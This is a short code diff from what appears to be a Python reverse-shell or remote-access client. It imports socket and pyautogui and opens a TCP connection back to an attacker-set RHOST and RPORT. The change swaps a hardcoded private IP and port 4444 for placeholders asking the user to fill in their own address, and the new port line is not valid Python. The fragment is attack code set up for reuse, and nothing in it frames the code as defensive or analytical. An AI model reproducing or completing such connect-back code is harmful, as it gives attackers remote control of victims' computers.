@@ -9,8 +9,8 @@ from time import sleep
 import pyautogui
 colorama.init()
 
-RHOST = "192.168.43.218"
-RPORT = 4444
+RHOST = "Your IP PLEASE"
+RPORT = you int port number Please
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect((RHOST, RPORT))
 
